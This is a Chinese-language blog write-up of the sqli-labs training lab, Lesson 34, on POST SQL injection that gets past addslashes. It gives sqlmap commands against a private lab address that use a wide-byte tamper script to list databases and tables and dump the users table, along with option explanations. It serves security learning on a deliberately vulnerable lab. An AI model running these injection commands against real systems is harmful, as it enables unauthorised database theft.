---
title: sqli-labs lession-34 POST-绕过AddSlashes
date: 2018-10-15 19:06:26
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-34 POST-绕过AddSlashes

---

## 登录界面

![001](/img/sql/Lesson-34/001.png)

## 注入

和前几课一样,不过类型是POST罢了。

这里hackbar不好用了,用burpsuite做。

![002](/img/sql/Lesson-34/002.png)

最终结果

![003](/img/sql/Lesson-34/003.png)

把Lesson-32的payload直接复制进uname就行，详细过程查看Lesson-32

{% post_link sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠 点击查看Lesson-32%}

## SQLMAP

```
--data :指定请求内容
-p uname:指定检测参数仅uname
--method POST:指定请求方式为POST
--dbms mysql:指定后端数据库为mysql
--threads 10:并发线程最大为10 
--technique E：指定检测payload为报错注入
--tamper unmagicquotes.py：unmagicquotes.py脚本会使用宽字节绕过方法
-v 3：

1.只显示python错误以及严重的信息。
2.同时显示基本信息和警告信息。（默认）
3.同时显示debug信息。
4.同时显示注入的payload。
5.同时显示HTTP请求。
6.同时显示HTTP响应头。
7.同时显示HTTP响应页面
```

`sqlmap -u "http://192.168.75.132/sql/Less-34/" --data "uname=admin'&passwd=123&submit=Submit" -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -v 3`

![004](/img/sql/Lesson-34/004.png)

![005](/img/sql/Lesson-34/005.png)

`sqlmap -u "http://192.168.75.132/sql/Less-34/" --data "uname=admin'&passwd=123&submit=Submit" -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py --dbs`

![006](/img/sql/Lesson-34/006.png)

![007](/img/sql/Lesson-34/007.png)

`sqlmap -u "http://192.168.75.132/sql/Less-34/" --data "uname=admin'&passwd=123&submit=Submit" -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -D security --tables`

![008](/img/sql/Lesson-34/008.png)

![009](/img/sql/Lesson-34/009.png)

`sqlmap -u "http://192.168.75.132/sql/Less-34/" --data "uname=admin'&passwd=123&submit=Submit" -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -D security -T users --columns --dump`

![010](/img/sql/Lesson-34/010.png)

![011](/img/sql/Lesson-34/011.png)